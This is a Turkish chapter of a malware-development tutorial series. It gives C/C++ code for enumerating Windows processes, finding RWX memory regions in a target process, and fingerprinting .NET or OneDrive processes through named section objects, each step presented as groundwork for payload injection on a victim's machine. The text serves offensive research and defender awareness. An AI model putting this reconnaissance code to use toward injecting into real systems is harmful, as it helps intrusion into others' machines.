\newpage
\subsection{49. Kötü Amaçlı Yazılım Geliştirme Tekniği: RWX Avcılığı - Bölüm 2. Hedef Süreç Araştırma Teknikleri. Basit C/C++ örneği.}

﷽

![malware](./images/119/2024-05-02_13-59.png){width="80%"}      

Önceki yazılarımın [birinde](https://cocomelonc.github.io/tutorial/2022/02/01/malware-injection-16.html), RWX bellek arama mantığını kullanarak bir süreç enjeksiyon yöntemini açıkladım. Bugün aynı mantığı yeni bir hile ile uygulayacağım.

Hatırladığınız gibi, yöntem oldukça basit: Kurbanın sisteminde çalışan hedef süreçleri listeliyoruz, tahsis edilen bellek bloklarını tarıyoruz ve herhangi birinin RWX korumasına sahip olup olmadığını kontrol ediyoruz. Ardından payload’umuz bu bellek bloğuna yazıyoruz.      

### pratik örnek

Bugün biraz farklı bir teknik kullanacağım. Diyelim ki kurbanın makinesinde belirli bir süreci arıyoruz (enjeksiyon yapmak veya başka bir amaç için).     

Kurban sürecinden RWX bellek bölgesini avlamak için ayrı bir fonksiyon kullanalım. Şuna benzer bir şey:     

```cpp
int findRWX(HANDLE h) {

  MEMORY_BASIC_INFORMATION mbi = {};
  LPVOID addr = 0;

  // query remote process memory information
  while (VirtualQueryEx(h, addr, &mbi, sizeof(mbi))) {
    addr = (LPVOID)((DWORD_PTR) mbi.BaseAddress + mbi.RegionSize);

    // look for RWX memory regions which are not backed by an image
    if (mbi.Protect == PAGE_EXECUTE_READWRITE
      && mbi.State == MEM_COMMIT
      && mbi.Type == MEM_PRIVATE)

      printf("found RWX memory: 0x%x - %#7llu bytes region\n", 
      mbi.BaseAddress, mbi.RegionSize);
  }

  return 0;
}
```

Ayrıca, ana mantığımızda küçük bir güncelleme yapalım: Öncelikle, belirli bir sürecin tutamacını (handle) adını kullanarak arıyoruz:     

```cpp
typedef NTSTATUS (NTAPI * fNtGetNextProcess)(
  _In_ HANDLE ProcessHandle,
  _In_ ACCESS_MASK DesiredAccess,
  _In_ ULONG HandleAttributes,
  _In_ ULONG Flags,
  _Out_ PHANDLE NewProcessHandle
);

int findMyProc(const char * procname) {
  int pid = 0;
  HANDLE current = NULL;
  char procName[MAX_PATH];

  // resolve function address
  fNtGetNextProcess myNtGetNextProcess = 
  (fNtGetNextProcess) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtGetNextProcess");

  // loop through all processes
  while (!myNtGetNextProcess(current, MAXIMUM_ALLOWED, 0, 0, &current)) {
    GetProcessImageFileNameA(current, procName, MAX_PATH);
    if (lstrcmpiA(procname, PathFindFileName((LPCSTR) procName)) == 0) {
      pid = GetProcessId(current);
      break;
    }
  }

  return current;
}
```

Gördüğünüz gibi, süreçleri listelemek için `NtGetNextProcess` API'sini [kullanıyoruz](https://cocomelonc.github.io/malware/2023/05/26/malware-tricks-30.html).    

Sonuç olarak, nihai kaynak kodu şu şekilde görünüyor (`hack.c`):     

```cpp
/*
 * hack.c - hunting RWX memory
 * @cocomelonc
 * https://cocomelonc.github.io/malware/2024/05/01/malware-trick-38.html
*/
#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <shlwapi.h>
#include <strsafe.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI * fNtGetNextProcess)(
  _In_ HANDLE ProcessHandle,
  _In_ ACCESS_MASK DesiredAccess,
  _In_ ULONG HandleAttributes,
  _In_ ULONG Flags,
  _Out_ PHANDLE NewProcessHandle
);

int findMyProc(const char * procname) {
  int pid = 0;
  HANDLE current = NULL;
  char procName[MAX_PATH];

  // resolve function address
  fNtGetNextProcess myNtGetNextProcess = 
  (fNtGetNextProcess) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtGetNextProcess");

  // loop through all processes
  while (!myNtGetNextProcess(current, MAXIMUM_ALLOWED, 0, 0, &current)) {
    GetProcessImageFileNameA(current, procName, MAX_PATH);
    if (lstrcmpiA(procname, PathFindFileName((LPCSTR) procName)) == 0) {
      pid = GetProcessId(current);
      break;
    }
  }

  return current;
}


int findRWX(HANDLE h) {

  MEMORY_BASIC_INFORMATION mbi = {};
  LPVOID addr = 0;

  // query remote process memory information
  while (VirtualQueryEx(h, addr, &mbi, sizeof(mbi))) {
    addr = (LPVOID)((DWORD_PTR) mbi.BaseAddress + mbi.RegionSize);

    // look for RWX memory regions which are not backed by an image
    if (mbi.Protect == PAGE_EXECUTE_READWRITE
      && mbi.State == MEM_COMMIT
      && mbi.Type == MEM_PRIVATE)

      printf("found RWX memory: 0x%x - %#7llu bytes region\n", 
      mbi.BaseAddress, mbi.RegionSize);
  }

  return 0;
}


int main(int argc, char* argv[]) {
  char procNameTemp[MAX_PATH];
  HANDLE h = NULL;
  int pid = 0;
  h = findMyProc(argv[1]);
  if (h) GetProcessImageFileNameA(h, procNameTemp, MAX_PATH);
  pid = GetProcessId(h);
  printf("%s%d\n", pid > 0 ? "process found at pid = " : 
  "process not found. pid = ", pid);
  findRWX(h);
  CloseHandle(h);
  
  return 0;
}
```

### demo

Haydi her şeyi çalışırken görelim. Kötü amaçlı yazılım kaynak kodumuzu derleyelim:     

```bash
x86_64-w64-mingw32-g++ hack.c -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive \
-w -lpsapi -lshlwapi
```

![malware](./images/119/2024-05-01_01-47.png){width="80%"}      

Ve bunu kurbanın makinesinde çalıştıralım (benim durumumda `Windows 11 x64`):     

![malware](./images/119/2024-05-02_06-30.png){width="80%"}      

Başka bir hedef işlemde deneyin, örneğin `OneDrive.exe`:     

![malware](./images/119/2024-05-02_11-40.png){width="80%"}      

Bu mantık çalıştı, RWX belleği başarıyla bulundu!    

Gördüğünüz gibi, her şey mükemmel çalıştı! =^..^=    

### pratik örnek 2

Ancak bazı nüanslar var. Bazen bir sürecin gerçekten `.NET` süreci mi, Java süreci mi yoksa başka bir şey mi olduğunu bilmemiz gerekir (gerçekten `OneDrive.exe` süreci mi?).     

`.NET` süreci olup olmadığını anlamak için ilginç bir teknik gerekiyor. Eğer Process Hacker 2 ile `powershell.exe` açarsak:     

![malware](./images/119/2024-05-02_12-59.png){width="80%"}      

Gördüğünüz gibi, `Handles` sekmesinde `\BaseNamedObjects\Cor_Private_IPCBlock_v4_<PID>` adında ilginç bir bölüm bulabiliriz. Bizim durumumuzda `PID = 3156`, yani bizim stringimiz şu olur: `\BaseNamedObjects\Cor_Private_IPCBlock_v4_3156`    

Öyleyse, `findMyProc` fonksiyonumuzu buna göre güncelleyelim:    

```cpp
HANDLE findMyProc(const char * procname) {
  int pid = 0;
  HANDLE current = NULL;
  char procName[MAX_PATH];

  // resolve function addresses
  fNtGetNextProcess_t myNtGetNextProcess = 
  (fNtGetNextProcess_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtGetNextProcess");
  fNtOpenSection_t myNtOpenSection = 
  (fNtOpenSection_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtOpenSection");

  // loop through all processes
  while (!myNtGetNextProcess(current, MAXIMUM_ALLOWED, 0, 0, &current)) {
    GetProcessImageFileNameA(current, procName, MAX_PATH);
    if (lstrcmpiA(procname, PathFindFileNameA(procName)) == 0) {
      pid = GetProcessId(current);
      
      // Check for "\\BaseNamedObjects\\Cor_Private_IPCBlock_v4_<PID>" section
      UNICODE_STRING sName;
      OBJECT_ATTRIBUTES oa;
      HANDLE sHandle = NULL;
      WCHAR procNumber[32];

      WCHAR objPath[] = L"\\BaseNamedObjects\\Cor_Private_IPCBlock_v4_";
      sName.Buffer = (PWSTR) malloc(500);

      // convert INT to WCHAR
      swprintf_s(procNumber, L"%d", pid);

      // and fill out UNICODE_STRING structure
      ZeroMemory(sName.Buffer, 500);
      memcpy(sName.Buffer, objPath, wcslen(objPath) * 2);   // add section name "prefix"
      StringCchCatW(sName.Buffer, 500, procNumber);      // and append with process ID
      sName.Length = wcslen(sName.Buffer) * 2;    // finally, adjust the string size
      sName.MaximumLength = sName.Length + 1;    
      
      InitializeObjectAttributes(&oa, &sName, OBJ_CASE_INSENSITIVE, NULL, NULL);
      NTSTATUS status = myNtOpenSection(&sHandle, SECTION_QUERY, &oa);
      if (NT_SUCCESS(status)) {
        CloseHandle(sHandle);
        break;
      }
    }
  }

  return current;
}
```

Sadece işlem kimliğini (process ID) UNICODE_STRING'e çevirin, birleştirin ve ardından bölümü (section) bulma mantığını uygulayın.      

Burada, mevcut bir section nesnesi için bir tanıtıcı açmak amacıyla `NtOpenSection` API'si kullanılıyor:     

```cpp
typedef NTSTATUS (NTAPI * fNtOpenSection)(
  PHANDLE            SectionHandle,
  ACCESS_MASK        DesiredAccess,
  POBJECT_ATTRIBUTES ObjectAttributes
);
```

Bu mantıkla (`.NET` süreçlerini kurbanın sisteminde bulmak için) tam kaynak kodu şu şekildedir:    

```cpp
/*
 * hack2.c - hunting RWX memory
 * detect .NET process
 * @cocomelonc
 * https://cocomelonc.github.io/malware/2024/05/01/malware-trick-38.html
*/
#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <shlwapi.h>
#include <strsafe.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI * fNtGetNextProcess_t)(
  _In_ HANDLE ProcessHandle,
  _In_ ACCESS_MASK DesiredAccess,
  _In_ ULONG HandleAttributes,
  _In_ ULONG Flags,
  _Out_ PHANDLE NewProcessHandle
);

typedef NTSTATUS (NTAPI * fNtOpenSection_t)(
  PHANDLE            SectionHandle,
  ACCESS_MASK        DesiredAccess,
  POBJECT_ATTRIBUTES ObjectAttributes
);

HANDLE findMyProc(const char * procname) {
  int pid = 0;
  HANDLE current = NULL;
  char procName[MAX_PATH];

  // resolve function addresses
  fNtGetNextProcess_t myNtGetNextProcess = (fNtGetNextProcess_t) 
  GetProcAddress(GetModuleHandle("ntdll.dll"), "NtGetNextProcess");
  fNtOpenSection_t myNtOpenSection = (fNtOpenSection_t) 
  GetProcAddress(GetModuleHandle("ntdll.dll"), "NtOpenSection");

  // loop through all processes
  while (!myNtGetNextProcess(current, MAXIMUM_ALLOWED, 0, 0, &current)) {
    GetProcessImageFileNameA(current, procName, MAX_PATH);
    if (lstrcmpiA(procname, PathFindFileNameA(procName)) == 0) {
      pid = GetProcessId(current);
      
      // check for "\\BaseNamedObjects\\Cor_Private_IPCBlock_v4_<PID>" section
      UNICODE_STRING sName;
      OBJECT_ATTRIBUTES oa;
      HANDLE sHandle = NULL;
      WCHAR procNumber[32];

      WCHAR objPath[] = L"\\BaseNamedObjects\\Cor_Private_IPCBlock_v4_";
      sName.Buffer = (PWSTR) malloc(500);

      // convert INT to WCHAR
      swprintf_s(procNumber, L"%d", pid);

      // and fill out UNICODE_STRING structure
      ZeroMemory(sName.Buffer, 500);
      memcpy(sName.Buffer, objPath, wcslen(objPath) * 2);   // add section name "prefix"
      StringCchCatW(sName.Buffer, 500, procNumber);      // and append with process ID
      sName.Length = wcslen(sName.Buffer) * 2;    // finally, adjust the string size
      sName.MaximumLength = sName.Length + 1;    
      
      InitializeObjectAttributes(&oa, &sName, OBJ_CASE_INSENSITIVE, NULL, NULL);
      NTSTATUS status = myNtOpenSection(&sHandle, SECTION_QUERY, &oa);
      if (NT_SUCCESS(status)) {
        CloseHandle(sHandle);
        break;
      }
    }
  }

  return current;
}



int findRWX(HANDLE h) {

  MEMORY_BASIC_INFORMATION mbi = {};
  LPVOID addr = 0;

  // query remote process memory information
  while (VirtualQueryEx(h, addr, &mbi, sizeof(mbi))) {
    addr = (LPVOID)((DWORD_PTR) mbi.BaseAddress + mbi.RegionSize);

    // look for RWX memory regions which are not backed by an image
    if (mbi.Protect == PAGE_EXECUTE_READWRITE
      && mbi.State == MEM_COMMIT
      && mbi.Type == MEM_PRIVATE)

      printf("found RWX memory: 0x%x - %#7llu bytes region\n", mbi.BaseAddress, mbi.RegionSize);
  }

  return 0;
}


int main(int argc, char* argv[]) {
  char procNameTemp[MAX_PATH];
  HANDLE h = NULL;
  int pid = 0;
  h = findMyProc(argv[1]);
  if (h) GetProcessImageFileNameA(h, procNameTemp, MAX_PATH);
  pid = GetProcessId(h);
  printf("%s%d\n", pid > 0 ? "process found at pid = " : 
  "process not found. pid = ", pid);
  findRWX(h);
  CloseHandle(h);
  
  return 0;
}
```

### demo 2

Gelin, ikinci örneği çalıştırarak mantığı görelim. Derleyin:      

```bash
x86_64-w64-mingw32-g++ hack2.c -o hack2.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive \
-lpsapi -lshlwapi -w
```

![malware](./images/119/2024-05-02_13-07.png){width="80%"}      

Sonra çalıştırın ve `powershell.exe` üzerinde kontrol edin:     

```powershell
.\hack2.exe powershell.exe
```

![malware](./images/119/2024-05-02_13-10.png){width="80%"}      

Şimdi, ikinci pratik örnek beklendiği gibi çalıştı! Harika! =^..^=    

### pratik örnek 3

Peki, önceki soruya ne dersiniz?    

Mağdur sürecin gerçekten `OneDrive.exe` olup olmadığını nasıl kontrol edebiliriz?
Bu sadece bir önlem olarak düşünülebilir.     

Haydi, Process Hacker 2 aracılığıyla `OneDrive.exe` sürecinin özelliklerini kontrol edelim:    

![malware](./images/119/2024-05-02_13-33.png){width="80%"}      

Gördüğünüz gibi, aynı yöntemi kullanabiliriz: bölüm adını kontrol edin:
`\Sessions\1\BaseNamedObjects\UrlZonesSM_test1`. Tabii ki, yanlış olabilirim ve bu dizeyi görmek, sürecin kesinlikle `OneDrive.exe` olduğunu garanti etmez. Ben sadece, herhangi bir süreci inceleyerek, bölüm adlarında bazı göstergeler bulmaya çalışabileceğinizi göstermek istedim.     

Bu yüzden fonksiyonumu tekrar güncelledim ve üçüncü örneğimin tam kaynak kodu (`hack3.c`) şu şekilde:         

```cpp
/*
 * hack.c - hunting RWX memory
 * @cocomelonc
 * https://cocomelonc.github.io/malware/2024/05/01/malware-trick-38.html
*/
#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <shlwapi.h>
#include <strsafe.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI * fNtGetNextProcess_t)(
  _In_ HANDLE ProcessHandle,
  _In_ ACCESS_MASK DesiredAccess,
  _In_ ULONG HandleAttributes,
  _In_ ULONG Flags,
  _Out_ PHANDLE NewProcessHandle
);

typedef NTSTATUS (NTAPI * fNtOpenSection_t)(
  PHANDLE            SectionHandle,
  ACCESS_MASK        DesiredAccess,
  POBJECT_ATTRIBUTES ObjectAttributes
);

HANDLE findMyProc(const char *procname) {
  HANDLE current = NULL;
  char procName[MAX_PATH];

  // resolve function addresses
  fNtGetNextProcess_t myNtGetNextProcess = 
  (fNtGetNextProcess_t)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtGetNextProcess");
  fNtOpenSection_t myNtOpenSection = 
  (fNtOpenSection_t)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtOpenSection");

  // loop through all processes
  while (!myNtGetNextProcess(current, MAXIMUM_ALLOWED, 0, 0, &current)) {
    GetProcessImageFileNameA(current, procName, MAX_PATH);
    if (lstrcmpiA(procname, PathFindFileNameA(procName)) == 0) {
      // check for "\Sessions\1\BaseNamedObjects\UrlZonesSM_test1" section
      UNICODE_STRING sName;
      OBJECT_ATTRIBUTES oa;
      HANDLE sHandle = NULL;

      WCHAR objPath[] = L"\\Sessions\\1\\BaseNamedObjects\\UrlZonesSM_test1";
      sName.Buffer = (PWSTR)objPath;
      sName.Length = wcslen(objPath) * sizeof(WCHAR);
      sName.MaximumLength = sName.Length + sizeof(WCHAR);

      InitializeObjectAttributes(&oa, &sName, OBJ_CASE_INSENSITIVE, NULL, NULL);
      NTSTATUS status = myNtOpenSection(&sHandle, SECTION_QUERY, &oa);
      if (NT_SUCCESS(status)) {
        CloseHandle(sHandle);
        break;
      }
    }
  }
  return current;
}

int findRWX(HANDLE h) {

  MEMORY_BASIC_INFORMATION mbi = {};
  LPVOID addr = 0;

  // query remote process memory information
  while (VirtualQueryEx(h, addr, &mbi, sizeof(mbi))) {
    addr = (LPVOID)((DWORD_PTR) mbi.BaseAddress + mbi.RegionSize);

    // look for RWX memory regions which are not backed by an image
    if (mbi.Protect == PAGE_EXECUTE_READWRITE
      && mbi.State == MEM_COMMIT
      && mbi.Type == MEM_PRIVATE)

      printf("found RWX memory: 0x%x - %#7llu bytes region\n", mbi.BaseAddress, mbi.RegionSize);
  }

  return 0;
}


int main(int argc, char* argv[]) {
  char procNameTemp[MAX_PATH];
  HANDLE h = NULL;
  int pid = 0;
  h = findMyProc(argv[1]);
  if (h) GetProcessImageFileNameA(h, procNameTemp, MAX_PATH);
  pid = GetProcessId(h);
  printf("%s%d\n", pid > 0 ? "process found at pid = " : 
  "process not found. pid = ", pid);
  findRWX(h);
  CloseHandle(h);
  
  return 0;
}
```

Gördüğünüz gibi, mantık basit: bölüm (section) adını kontrol edin ve açmayı deneyin.     

### demo 3

Hadi üçüncü örneği çalışırken görelim. Önce derleyelim:     

```bash
x86_64-w64-mingw32-g++ hack3.c -o hack3.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive \
-lpsapi -lshlwapi -w
```

![malware](./images/119/2024-05-02_13-51.png){width="80%"}      

Ardından, bunu hedef makinede çalıştırın:      

```powershell
.\hack3.exe OneDrive.exe
```

![malware](./images/119/2024-05-02_13-53.png){width="80%"}      

Gördüğünüz gibi, her şey yine mükemmel çalıştı!     

Eğer biri bu yönteme benzer bir tekniği gerçek bir zararlı yazılımda veya APT saldırısında gördüyse, lütfen bana yazsın. Belki de yeterince araştırmadım, bana bu tekniğin saldırganlar tarafından zaten bilindiği gibi geliyor.    

Umarım bu gönderi, mavi takım üyelerinin bu ilginç süreç araştırma tekniğine dair farkındalığını artırır ve kırmızı takım üyelerinin cephaneliğine yeni bir silah ekler.     

[Process injection via RWX-memory hunting. Simple C++ example.](https://cocomelonc.github.io/tutorial/2022/02/01/malware-injection-16.html)      
[Malware development trick - part 30: Find PID via NtGetNextProcess. Simple C++ example.](https://cocomelonc.github.io/malware/2023/05/26/malware-tricks-30.html)    
[github'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2024-04-09-malware-cryptography-26)    
